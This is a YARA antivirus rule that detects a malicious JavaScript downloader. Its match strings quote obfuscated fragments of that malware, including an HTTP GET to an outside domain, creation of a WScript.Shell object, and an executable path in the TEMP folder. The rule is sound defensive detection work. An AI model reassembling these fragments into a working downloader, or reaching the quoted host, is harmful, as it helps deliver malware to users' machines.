rule sig_20160401_c91328c94f2e7817ab39b75df71acf26 {
  meta:
    description = "datamaliciousorder - file 20160401_c91328c94f2e7817ab39b75df71acf26.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "214196fa544800489b7fcf4c84b56e12d2e1229021116efe0116170f2ed826c9"

  strings:
    $s1  = "IutQj[CnXul](\"G\" + \"ET\", \"http://xn--80ailp.com/q7usja\", false);" fullword ascii
    $s2  = "function QhXo(HrOx, VrCk){TaOgp = TaOgp * 1; return HrOx - VrCk;};" fullword ascii
    $s3  = "var EnGgp = function VafOnf() {return WScript[PkiGkc](\"WScript\"+\".Shell\");}(), MzPmj = 11;" fullword ascii
    $s4  = "if (IutQj[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "var NaIk = SbwCco[\"getUTCMilliseconds\"]();" fullword ascii
    $s6  = "function KbAn(){return DwsTj + \"\";};" fullword ascii
    $s7  = "function GsTps() {return EnGgp[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"2J2TabAW3Arcd3.ex\" + \"e\";};" fullword ascii
    $s8  = "function PkLgv() {return ((EnXz == true) && (EnXz == VlNg)) ? 1 : TaOgp;};" fullword ascii
    $s9  = "}while (HnPrt);" fullword ascii
    $s10 = "return QhXo(YmaUl, VfjQel);" fullword ascii
    $s11 = "function DomLdc(QkwGv) {var EvDxr = (1, 2, 3, 4, 5, QkwGv); return EvDxr;};" fullword ascii
    $s12 = "var SbwCco = new this[\"Date\"]();" fullword ascii
    $s13 = "YmaUl = QhXo(NaIk, EqGb);" fullword ascii
    $s14 = "var VlNg = false;" fullword ascii
    $s15 = "VfjQel = QhXo(DaYhk, NaIk);" fullword ascii
    $s16 = "var HfvLns = false;" fullword ascii
    $s17 = "VlNg = true; " fullword ascii
    $s18 = "EnXz = true; " fullword ascii
    $s19 = "function JeuQs(){return 23;};" fullword ascii
    $s20 = "function JwPsp(){return PkiGkc;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}